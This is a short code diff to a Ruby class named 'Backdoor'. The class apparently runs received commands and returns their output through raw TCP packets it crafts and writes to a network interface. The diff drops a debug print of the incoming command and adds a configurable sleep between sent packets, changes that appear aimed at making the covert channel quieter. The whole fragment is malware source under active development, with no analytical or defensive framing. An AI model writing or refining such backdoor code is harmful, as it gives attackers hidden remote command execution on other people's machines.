@@ -106,7 +106,6 @@ class Backdoor
                         send_data(get_command(cmd[1]), packet)
                     end # cmd[1] else
                 else # cmd[0]
-                    puts @command
                     send_data(run_command(@command), packet)
                 end # cmd[0] else
                 @command = ""
@@ -153,6 +152,8 @@ class Backdoor
             
             tcp.recalc
             tcp.to_w(@iface)
+            
+            sleep @conf_array[4].to_i
         end # each_byte
         
         #-----------------------------------------------------------------------
